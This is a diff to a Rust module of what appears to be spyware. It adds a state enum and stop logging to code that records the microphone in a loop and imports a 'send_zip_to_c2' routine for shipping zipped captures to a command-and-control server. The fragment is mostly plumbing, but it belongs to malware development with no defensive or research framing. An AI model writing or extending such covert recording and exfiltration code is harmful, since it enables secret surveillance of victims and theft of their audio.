@@ -9,6 +9,12 @@ use tokio::sync::Mutex as AsyncMutex;
 
 use crate::connexion::{send_zip_to_c2, zip_file};
 
+pub enum MicRecStatus {
+    Idle,
+    Running,
+}
+static MIC_REC_STATE: OnceLock<Arc<tokio::sync::Mutex<MicRecStatus>>> = OnceLock::new();
+
 static MIC_REC_FLAG: OnceLock<Arc<AtomicBool>> = OnceLock::new();
 
 pub async fn record_mic(duration_secs: u64) -> Result<()> {
@@ -115,6 +121,7 @@ pub fn init_mic_rec_flag() -> Arc<AtomicBool> {
 
 pub fn stop_mic_rec() {
     if let Some(flag) = MIC_REC_FLAG.get() {
+        println!("[MIC_FLAG] Arrêt demandé");
         flag.store(false, Ordering::SeqCst);
     }
 }
@@ -133,4 +140,10 @@ pub async fn mic_rec_loop(flag: Arc<AtomicBool>) -> anyhow::Result<()> {
     }
     println!("[MIC] Boucle d'enregistrement arrêtée proprement");
     Ok(())
+}
+
+pub fn init_mic_rec_state() -> Arc<tokio::sync::Mutex<MicRecStatus>> {
+    MIC_REC_STATE
+        .get_or_init(|| Arc::new(tokio::sync::Mutex::new(MicRecStatus::Idle)))
+        .clone()
 }
